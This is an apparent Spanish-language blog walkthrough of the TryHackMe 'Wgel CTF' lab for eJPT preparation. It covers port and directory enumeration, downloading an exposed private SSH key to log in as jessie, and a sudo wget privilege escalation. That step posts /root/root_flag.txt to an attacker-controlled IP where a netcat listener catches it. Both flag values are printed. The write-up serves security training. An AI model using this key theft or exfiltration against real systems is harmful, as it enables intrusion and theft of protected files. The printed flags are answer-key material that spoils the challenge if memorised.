---
title: "Wgel CTF"
date: 2026-01-14
draft: false
description: "Walkthrough de Wgel CTF de TryHackMe. Llave SSH privada expuesta en directorio web, acceso como jessie y escalada de privilegios con wget via GTFOBins — preparación eJPT."
tags:
  [
    "walkthrough",
    "tryhackme",
    "ejpt",
    "linux",
    "ssh",
    "gobuster",
    "wget",
    "gtfobins",
    "privesc",
    "web",
  ]
categories: ["Walkthroughs"]
series: ["Road to eJPTv2"]
ShowToc: true
TocOpen: false
weight: 11
---

## Resumen

**Wgel CTF** es la undécima máquina de la serie _Road to eJPTv2_. Una máquina que premia la enumeración exhaustiva: un nombre de usuario en el código fuente HTML, una llave SSH privada expuesta en un directorio web oculto, y una escalada de privilegios creativa usando `wget` con permisos de sudo.

Sin brute force, sin exploits públicos — solo enumeración cuidadosa y abuso de configuraciones incorrectas.

| Atributo       | Valor                                                    |
| -------------- | -------------------------------------------------------- |
| **Plataforma** | TryHackMe                                                |
| **Dificultad** | Fácil                                                    |
| **OS**         | Linux (Ubuntu)                                           |
| **Sala**       | [Wgel CTF](https://tryhackme.com/room/wgelctf)           |
| **Skills**     | Web Enum, SSH Key, Source Code Analysis, GTFOBins (wget) |

### Herramientas usadas

- `nmap` — escaneo de puertos y versiones
- `whatweb` — fingerprinting web
- `gobuster` — fuzzing de directorios web
- `ssh` — acceso con llave privada
- `netcat` — recepción del archivo exfiltrado

### Resumen de la solución

1. **Reconocimiento:** nmap detecta solo SSH y HTTP. La página principal muestra el default de Apache.
2. **Código fuente:** Un comentario HTML revela el usuario `jessie`.
3. **Fuzzing web:** gobuster encuentra `/sitemap/`. Un segundo fuzzing con extensiones SSH descubre `/.ssh/` dentro del sitemap.
4. **Llave SSH:** El directorio `.ssh` expuesto contiene una `id_rsa` descargable.
5. **Acceso SSH:** Con la llave privada accedemos al sistema como `jessie`.
6. **User flag:** Encontrada en `/home/jessie/Documents/user_flag.txt`.
7. **sudo -l:** `jessie` puede ejecutar `/usr/bin/wget` como root sin contraseña.
8. **Privesc:** Usamos `sudo wget --post-file` para exfiltrar `/root/root_flag.txt` a nuestra máquina vía HTTP POST.

---

## Reconocimiento

### Ping

Verificamos conectividad e identificamos el SO por el TTL:

```bash
ping -c 1 10.66.131.92
```

```
64 bytes from 10.66.131.92: icmp_seq=1 ttl=62 time=77.0 ms
```

TTL 62 → Linux (el valor original es 64, se decrementó en los saltos de red).

### Nmap — Escaneo de puertos

```bash
nmap 10.66.131.92 -n -Pn -sS -p- --open --min-rate=5000 -oG allTCPports
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Solo dos puertos abiertos. Superficie de ataque reducida — toda la enumeración será web.

### Nmap — Versiones y scripts

```bash
nmap 10.66.131.92 -n -Pn -sS -p22,80 -sVC --min-rate=5000 -oN wgelscan.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

La página principal es el default de Apache — nada visible a primera vista. Hay que profundizar.

### Whatweb

```bash
whatweb http://10.66.131.92
```

```
http://10.66.131.92 [200 OK] Apache[2.4.18], Title[Apache2 Ubuntu Default Page: It works]
```

Confirma Apache 2.4.18 sin información adicional.

### Código fuente — Usuario jessie

Inspeccionamos el código fuente de la página principal (`view-source:http://10.66.131.92`) y encontramos un comentario HTML que delata un nombre de usuario:

![Comentario HTML con usuario jessie](./source-code-jessie.png)

```html
<!-- Jessie don't forget to udate the webiste -->
```

> **Usuario encontrado:** `jessie`

### Fuzzing web — gobuster (raíz)

```bash
gobuster dir -u http://10.66.131.92 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,css,xml,bak -t 50
```

```
/index.html   (Status: 200)
/sitemap      (Status: 301)
```

Encontramos `/sitemap/` — un sitio web real oculto bajo el default de Apache.

### Fuzzing web — gobuster (sitemap)

```bash
gobuster dir -u http://10.66.131.92/sitemap/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,css,xml,bak -t 50
```

```
/index.html    (Status: 200)
/about.html    (Status: 200)
/contact.html  (Status: 200)
/blog.html     (Status: 200)
/services.html (Status: 200)
/shop.html     (Status: 200)
/work.html     (Status: 200)
/images        (Status: 301)
/css           (Status: 301)
/js            (Status: 301)
/fonts         (Status: 301)
```

Sitio web completo pero sin contenido sensible aparente. Cambiamos la estrategia y buscamos archivos específicos de SSH:

```bash
gobuster dir -u http://10.66.131.92/sitemap/ -w /usr/share/wordlists/dirb/common.txt -x .ssh,id_rsa,id_rsa.bak,.bash_history,.env,.git
```

```
/.ssh   (Status: 301)
```

¡Directorio `.ssh` expuesto públicamente!

### Llave SSH privada expuesta

Accedemos a `http://10.66.131.92/sitemap/.ssh/` y encontramos un directory listing con una llave RSA privada:

![Directorio .ssh con id_rsa expuesta](./ssh-directory.png)

![Contenido de la llave privada id_rsa](./id-rsa-key.png)

Descargamos la llave:

```bash
wget http://10.66.131.92/sitemap/.ssh/id_rsa
```

---

## Explotación

### Acceso SSH con llave privada

Asignamos los permisos correctos a la llave y nos conectamos como `jessie`:

```bash
chmod 600 id_rsa
ssh jessie@10.66.131.92 -i id_rsa
```

```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
jessie@CorpOne:~$
```

Acceso al sistema sin necesidad de contraseña.

---

## Post-Explotación

### User flag

```bash
jessie@CorpOne:~$ cd Documents/
jessie@CorpOne:~/Documents$ cat user_flag.txt
057c67131c3d5e42dd5cd3075b198ff6
```

> **User flag:** `057c67131c3d5e42dd5cd3075b198ff6`

### Enumeración de sudo

```bash
jessie@CorpOne:~$ sudo -l
```

```
User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

`jessie` puede ejecutar `wget` como root **sin contraseña**. Esto es un vector de privesc documentado en GTFOBins.

---

## Escalada de privilegios

### wget — Exfiltración de archivos root

`wget` con `sudo` y el flag `--post-file` permite enviar el contenido de cualquier archivo como cuerpo de una petición HTTP POST — incluyendo archivos que solo root puede leer.

**Máquina atacante** — ponemos netcat en escucha en el puerto 80:

```bash
nc -lvnp 80
```

**Máquina víctima** — enviamos el root flag como POST a nuestra IP:

```bash
jessie@CorpOne:~$ sudo wget --post-file=/root/root_flag.txt 192.168.136.70
```

**Máquina atacante** — recibimos el contenido del archivo en la petición HTTP:

```bash
connect to [192.168.136.70] from (UNKNOWN) [10.66.131.92] 41262
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d
```

> **Root flag:** `b1b968b37519ad1daa6408188649263d`

---

## Lecciones aprendidas

- **El código fuente HTML siempre merece revisión** — Un comentario descuidado de un desarrollador reveló el nombre de usuario que permitió toda la cadena de ataque. Siempre revisar `view-source` antes de avanzar.
- **Cambiar la wordlist y las extensiones cambia los resultados** — El primer gobuster no encontró el directorio `.ssh`. El segundo, usando `common.txt` con extensiones SSH específicas, lo encontró. La elección de la wordlist importa.
- **Un directorio `.ssh` expuesto en web es un fallo crítico** — Una llave privada descargable equivale a acceso total al sistema sin necesidad de contraseña. Los directorios `.ssh` nunca deben ser accesibles desde el servidor web.
- **`sudo -l` es siempre el primer comando en post-explotación** — Revisar qué puede ejecutar el usuario actual con sudo es una de las verificaciones más rápidas y productivas en privesc.
- **GTFOBins cubre `wget` con múltiples técnicas** — Con `sudo wget` se puede leer archivos (`--post-file`), escribir archivos (descargando a rutas privilegiadas) o incluso obtener una shell en algunos escenarios. Siempre consultar GTFOBins ante cualquier binario con permisos sudo.

### Para la eJPT

| Concepto                    | Relevancia eJPT                                         |
| --------------------------- | ------------------------------------------------------- |
| Inspección de código fuente | Reconocimiento web básico en el examen                  |
| Fuzzing con extensiones SSH | Enumeración exhaustiva de directorios                   |
| Autenticación SSH por llave | Vector de acceso alternativo a contraseña               |
| sudo + GTFOBins             | Privesc sin exploits de kernel — muy común en el examen |

**Tiempo aproximado de resolución:** 30-40 minutos.

---

## Referencias

- [Wgel CTF — TryHackMe](https://tryhackme.com/room/wgelctf)
- [GTFOBins — wget](https://gtfobins.github.io/gtfobins/wget/)
- [SSH Key Authentication](https://www.ssh.com/academy/ssh/public-key-authentication)
